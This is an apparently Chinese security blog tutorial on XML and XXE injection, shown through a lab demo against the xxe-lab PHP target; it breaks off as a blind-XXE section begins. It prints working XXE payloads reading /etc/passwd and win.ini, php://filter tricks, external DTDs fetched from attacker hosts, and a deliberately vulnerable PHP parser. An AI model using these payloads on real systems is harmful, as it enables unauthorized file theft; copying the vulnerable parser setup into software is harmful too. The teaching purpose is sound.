<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>XXE详解 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="XXE详解" />
<meta property="og:description" content="一、XML基础知识 1、XML简介： XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素
XML 和 HTML 为不同的目的而设计：
XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。 HTML 旨在显示信息，而 XML 旨在传输信息。
2、XML 语法 1）XML 声明文件的可选部分，如果存在需要放在文档的第一行
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 2）XML 必须包含根元素，它是所有其他元素的父元素，下面note 是根元素
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt; &lt;/note&gt; 3）所有的 XML 元素都必须有一个关闭标签，并且标签对大小写敏感
&lt;Message&gt;这是错误的&lt;/message&gt; &lt;message&gt;这是错误的 &lt;message&gt;这是正确的&lt;/message&gt; 4）XML 属性值必须加引号
与 HTML 类似，XML 元素也可拥有属性（名称/值的对）。
在 XML 中，XML 的属性值必须加引号。
&lt;note date=&#34;12/11/2007&#34;&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;/note&gt; 5）实体引用
在 XML 中，一些字符拥有特殊的意义。
如果您把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。
这样会产生 XML 错误：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/0186cb73706e69c3f58e649d3aba5873/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-21T16:07:19+08:00" />
<meta property="article:modified_time" content="2023-07-21T16:07:19+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">XXE详解</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="XML_0"></a>一、XML基础知识</h3> 
<h4><a id="1XML_2"></a>1、XML简介：</h4> 
<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p> 
<p><img src="https://images2.imgbox.com/79/62/E7yqB98a_o.png" alt="在这里插入图片描述"></p> 
<p>XML 和 HTML 为不同的目的而设计：</p> 
<ul><li>XML 被设计用来传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观。</li></ul> 
<p>HTML 旨在显示信息，而 XML 旨在传输信息。</p> 
<h4><a id="2XML__16"></a>2、XML 语法</h4> 
<p>1）XML 声明文件的可选部分，如果存在需要放在文档的第一行</p> 
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</code></pre> 
<p>2）XML 必须包含根元素，它是所有其他元素的父元素，下面note 是根元素</p> 
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;note&gt;
  &lt;to&gt;Tove&lt;/to&gt;
  &lt;from&gt;Jani&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
&lt;/note&gt;
</code></pre> 
<p>3）所有的 XML 元素都必须有一个关闭标签，并且标签对大小写敏感</p> 
<pre><code>&lt;Message&gt;这是错误的&lt;/message&gt;
&lt;message&gt;这是错误的
&lt;message&gt;这是正确的&lt;/message&gt;
</code></pre> 
<p>4）XML 属性值必须加引号</p> 
<p>与 HTML 类似，XML 元素也可拥有属性（名称/值的对）。</p> 
<p>在 XML 中，XML 的属性值必须加引号。</p> 
<pre><code>&lt;note date="12/11/2007"&gt;   
&lt;to&gt;Tove&lt;/to&gt;
&lt;from&gt;Jani&lt;/from&gt;
&lt;/note&gt;
</code></pre> 
<p>5）实体引用</p> 
<p>在 XML 中，一些字符拥有特殊的意义。</p> 
<p>如果您把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p> 
<p>这样会产生 XML 错误：</p> 
<pre><code>&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;
</code></pre> 
<p>可以<strong>实体引用</strong>来代替 “&lt;” 字符</p> 
<pre><code>&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;
</code></pre> 
<p>在 XML 中，有 5 个预定义的实体引用：</p> 
<table><thead><tr><th>&amp;lt;</th><th>&lt;</th><th>less than</th></tr></thead><tbody><tr><td>&amp;gt;</td><td>&gt;</td><td>greater than</td></tr><tr><td>&amp;amp;</td><td>&amp;</td><td>ampersand</td></tr><tr><td>&amp;apos;</td><td>’</td><td>apostrophe</td></tr><tr><td>&amp;quot;</td><td>"</td><td>quotation mark</td></tr></tbody></table> 
<p>6）XML 中的注释</p> 
<p>在 XML 中编写注释的语法与 HTML 的语法很相似。</p> 
<pre><code>&lt;!-- This is a comment --&gt;
</code></pre> 
<p>7）XML 以 LF 存储换行</p> 
<p>在 Windows 应用程序中，换行通常以一对字符来存储：回车符（CR）和换行符（LF）。</p> 
<p>在 Unix 和 Mac OSX 中，使用 LF 来存储新行。</p> 
<p>在旧的 Mac 系统中，使用 CR 来存储新行。</p> 
<p>XML 以 LF 存储换行。</p> 
<p>8）XML 元素和XML 属性</p> 
<p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</p> 
<p>XML元素具有属性，类似 HTML。属性（Attribute）提供有关元素的额外信息。</p> 
<h4><a id="3DTD_110"></a>3、DTD</h4> 
<h5><a id="31DTD_112"></a>3.1、DTD简介</h5> 
<p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p> 
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p> 
<p><strong>内部的 DOCTYPE 声明</strong></p> 
<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE note [
&lt;!ELEMENT note (to,from,heading,body)&gt;
&lt;!ELEMENT to (#PCDATA)&gt;
&lt;!ELEMENT from (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body (#PCDATA)&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;Tove&lt;/to&gt;
&lt;from&gt;Jani&lt;/from&gt;
&lt;heading&gt;Reminder&lt;/heading&gt;
&lt;body&gt;Don't forget me this weekend&lt;/body&gt;
&lt;/note&gt; 
</code></pre> 
<p>以上 DTD 解释如下：</p> 
<ul><li><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档。</li><li><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：“to、from、heading,、body”</li><li><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</li><li><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</li><li><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</li><li><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</li></ul> 
<p><strong>外部文档声明</strong></p> 
<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p> 
<pre><code>&lt;!DOCTYPE root-element SYSTEM "filename"&gt;
</code></pre> 
<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:</p> 
<pre><code>&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE note SYSTEM "note.dtd"&gt;
 &lt;note&gt;
  &lt;to&gt;Tove&lt;/to&gt;
  &lt;from&gt;Jani&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
 &lt;/note&gt;
</code></pre> 
<p>这是包含 DTD 的 “note.dtd” 文件：</p> 
<pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;
&lt;!ELEMENT to (#PCDATA)&gt;
&lt;!ELEMENT from (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body (#PCDATA)&gt;
</code></pre> 
<h5><a id="32xml_177"></a>3.2、xml文档的构建模块</h5> 
<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p> 
<p>元素、属性、实体、PCDATA、CDATA</p> 
<p>1）元素</p> 
<p>元素是 XML 以及 HTML 文档的主要构建模块。</p> 
<p>HTML 元素的例子是 “body” 和 “table”。XML 元素的例子是 “note” 和 “message” 。元素可包含文本、其他元素或者是空的。</p> 
<pre><code>&lt;body&gt;body text in between&lt;/body&gt;
&lt;message&gt;some message in between&lt;/message&gt;
</code></pre> 
<p>空的 HTML 元素的例子是 “hr”、“br” 以及 “img”。</p> 
<p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p> 
<pre><code>&lt;!ELEMENT element-name category&gt;
 或
 &lt;!ELEMENT element-name (element-content)&gt;
</code></pre> 
<p>2）属性</p> 
<p>属性可提供有关元素的额外信息。</p> 
<p>属性总是被置于某元素的开始标签中。属性总是以名称/值的形式成对出现的。下面的 “img” 元素拥有关于源文件的额外信息：</p> 
<pre><code>&lt;img src="computer.gif" /&gt;   
</code></pre> 
<p>元素的名称是 “img”。属性的名称是 “src”。属性的值是 “computer.gif”。由于元素本身为空，它被一个 " /" 关闭。</p> 
<p>属性声明使用下列语法：</p> 
<pre><code>&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;
DTD 实例:
&lt;!ATTLIST payment type CDATA "check"&gt;
XML 实例:
&lt;payment type="check" /&gt;
</code></pre> 
<p>3）实体</p> 
<p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p> 
<table><thead><tr><th>实体引用</th><th>字符</th></tr></thead><tbody><tr><td>&lt;</td><td>&lt;</td></tr><tr><td>&gt;</td><td>&gt;</td></tr><tr><td>&amp;</td><td>&amp;</td></tr><tr><td>"</td><td>"</td></tr><tr><td>'</td><td>’</td></tr></tbody></table> 
<p>实体又分为一般实体和参数实体<br> 1，一般实体的声明语法:<code>&lt;!ENTITY 实体名 "实体内容"&gt;</code><br> 引用实体的方式：<code>&amp;实体名</code>；<br> 2，参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 "实体内容"&gt;</code><br> 引用实体的方式：<code>%实体名</code>；</p> 
<p><strong>内部实体声明</strong></p> 
<pre><code>语法
&lt;!ENTITY entity-name "entity-value"&gt;
实例
DTD 实例:
 &lt;!ENTITY writer "Donald Duck."&gt;
 &lt;!ENTITY copyright "Copyright runoob.com"&gt;
XML 实例：
&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
</code></pre> 
<p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 ( ; )。</p> 
<p><strong>外部实体声明</strong></p> 
<pre><code>语法
&lt;!ENTITY entity-name SYSTEM "URI/URL"&gt;
实例
DTD 实例:
 &lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;
 &lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;
XML example:
 &lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
</code></pre> 
<p>4）PCDATA</p> 
<p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p> 
<p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p> 
<p>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p> 
<p>文本中的标签会被当作标记来处理，而实体会被展开。</p> 
<p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p> 
<p>5）CDATA</p> 
<p>CDATA 的意思是字符数据（character data）。</p> 
<p>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p> 
<h3><a id="XXE_292"></a>二、XXE的攻击与危害</h3> 
<h4><a id="1XXE_294"></a>1、XXE漏洞原理和危害：</h4> 
<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p> 
<p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p> 
<h4><a id="2_300"></a>2、构建外部实体注入方法</h4> 
<p>1）直接通过DTD外部实体声明</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY b SYSTEM "file:///etc/passwd/"&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>2）通过DTD文档引入外部DTD文档，再引入外部实体声明</p> 
<p>XML内容：</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token name">SYSTEM</span> <span class="token string">"http://mark4z5.com/evil.dtd"</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>DTD文件内容：</p> 
<pre><code class="prism language-xml-dtd">&lt;!ENTITY b SYSTEM "file:///etc/passwd/"&gt;
</code></pre> 
<p>3）通过DTD外部实体声明引入外部实体声明</p> 
<p>先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明</p> 
<p>XML内容</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY %d SYSTEM "http://mark4z5.com/evil.dtd"&gt;
    %d;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>dtd文件内容：</p> 
<pre><code class="prism language-xml-dtd">&lt;!ENTITY b SYSTEM "file:///etc/passwd/"&gt;
</code></pre> 
<p><strong>注：外部实体的利用会用到协议如下:</strong></p> 
<table><thead><tr><th>LIBXML2</th><th>PHP</th><th>JAVA</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>http</td><td>file</td></tr><tr><td>http</td><td>http</td><td>https</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>https</td></tr><tr><td></td><td>php</td><td>file</td><td>ftp</td></tr><tr><td></td><td>compress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>compress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table> 
<h4><a id="3_XML__363"></a>3、寻找 XML 输入点</h4> 
<p>甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。</p> 
<p>例如：判断wsdl（web服务描述语言）。或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p> 
<p>例如：从PHP代码层面</p> 
<p>存在 <code>Content-Type：text/xml</code>, 说明post 的数据包含 XML 格式，如：</p> 
<pre><code>Copy&lt;forgot&gt;&lt;username&gt;admin&lt;/username&gt;&lt;/forgot&gt;
</code></pre> 
<p>可以在请求头中添加 <code>Content-Type：text/xml</code> 或 <code>Content-type:application/xml</code>，然后构造payload测试是否存在XXE攻击漏洞</p> 
<h4><a id="4XXE_379"></a>4、XXE漏洞利用实例</h4> 
<h5><a id="41_381"></a>4.1、文件读取（有回显）</h5> 
<p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a>的php靶场演示：</p> 
<p><strong>读取文件时无特殊符号</strong></p> 
<p>注意：这里我们要求php版本为5.2，5.3，5.4，因为他们的libxml版本为2.7.7，2.7.8<br> 允许加载外部实体，libxml版本在2.9.1之后，默认是不解析外部实体</p> 
<p><img src="https://images2.imgbox.com/b0/80/wk5Jb1Hb_o.png" alt="在这里插入图片描述"></p> 
<p>我们使用brupsuite抓包看看</p> 
<p><img src="https://images2.imgbox.com/5f/23/v34W3XUe_o.png" alt="在这里插入图片描述"></p> 
<p>判断传输类型是xml，通过post传输的数据。然后看一下返回的响应包</p> 
<p><img src="https://images2.imgbox.com/09/e6/gtVBDj6J_o.png" alt="在这里插入图片描述"></p> 
<p>发现，响应包返回的信息中，有username的值admin。</p> 
<p>那么我么尝试构造payload来构造外部实体admin处的注入，利用协议读取文件</p> 
<pre><code>网站在window系统上搭建：
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY xxes SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt;
&lt;user&gt;&lt;username&gt;&amp;xxes;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
网站在linux系统上搭建：
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY xxes SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;user&gt;&lt;username&gt;&amp;xxes;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/11/0c/qWntimNB_o.png" alt="在这里插入图片描述"></p> 
<p>成功读取c盘下win.in文件</p> 
<p>查看靶场doLogin.php源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
* autor: c0ny1
* date: 2018-2-7
*/</span>

<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">{<!-- --></span>
	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$dom</span><span class="token operator">-&gt;</span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>	
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>libxml_disable_entity_loader(false);函数意思就是不禁止外部实体加载；file_get_contents()函数，把整个文件读入一个字符串中。LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件 通过php://input协议获取POST请求数据，然后把数据通过file_get_contents()函数，放在$xmlfile变量中。</p> 
<p><strong>读取文件时有特殊符号</strong></p> 
<p>在读取文件时，文件中包含"&lt;,&gt;,&amp;"等这些特殊符号时，会被xml解析器解析，报错从而导致读取失败</p> 
<p>例如尝试创建并读取以下文件</p> 
<p>C:\test.txt 内容：<code>&lt;Baize Sec&gt;</code></p> 
<p><img src="https://images2.imgbox.com/67/1d/chBGvbtB_o.png" alt="在这里插入图片描述"></p> 
<p>发现抱错。原因是在 XML 元素中，“&lt;” 和 “&amp;” 是非法的。</p> 
<p>“&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。</p> 
<p>“&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。</p> 
<p>方法一：使用base64编码来读取</p> 
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE xxe [
&lt;!ENTITY xxes SYSTEM "PHP://filter/read=convert.base64-encode/resource=/C:/test.txt"&gt; ]&gt;
&lt;user&gt;&lt;username&gt;&amp;xxes;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/31/9a/tkfA1lN3_o.png" alt="在这里插入图片描述"></p> 
<p>后使用base64解密可得结果</p> 
<p>方法二：使用CDATA绕过</p> 
<p>某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。</p> 
<p>CDATA 部分由<code> "&lt;![CDATA[" 开始，由 "]]&gt;"</code> 结束。</p> 
<p>关于 CDATA 部分的注释：</p> 
<p>CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分。</p> 
<p>标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或折行。</p> 
<p>我们的思路就是把读取的文件放在CDATA中之后再调用，那么构造一个POC如下</p> 
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE roottag
[&lt;!ENTITY start
"&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM "file:///c:/test.txt"&gt; ]]&gt;"
&gt;]
% xxe;&gt;
&lt;user&gt;&lt;username&gt;&amp;start;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre> 
<p>发现抱错，因为xml 解析器有个限制：不能在内部 Entity 中引用，“PEReferences forbidden in internal subset in Entity ”指的就是禁止内部参数实体引用。</p> 
<p>所以可以搭建第二个服务器，实现调用的外部的dtd文档</p> 
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % start "&lt;![CDATA["&gt;
&lt;!ENTITY % go SYSTEM "file:///c:/test.txt"&gt;
&lt;!ENTITY % end "]]&gt;"&gt;
&lt;!ENTITY % dtd SYSTEM "http://192.168.220.128/evil.dtd"&gt; %dtd;
]&gt; 
&lt;user&gt;&lt;username&gt;&amp;start;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
</code></pre> 
<pre><code>http://192.168.220.128/evil.dtd
内容：
&lt;!ENTITY all "%start;%go;%end;"&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/f1/76/swLGAZgx_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="42_544"></a>4.2、文件读取（无回显）</h5> 
<p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a>的php靶场演示：</p> 
<p>我们将源码的输出代码注释掉，将错误信息也不显示</p> 
<p><img src="https://images2.imgbox.com/89/ea/Zktmx3tP_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">增加：
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   
注释：
<span class="token comment">#echo $result;</span>
</code></pre> 
<p>进行运行上面的POC，发现没有回显。</p> 
<p><img src="https://images2.imgbox.com/af/27/cIb1ypCm_o.png" alt="在这里插入图片描述"></p> 
<p>现在很多xxe漏洞都是没有回显的，下面是再没有回显的时候可以的利用方式。</p> 
<p><strong>方法一：</strong></p> 
<p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p> 
<pre><code class="prism language-xml-dtd"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
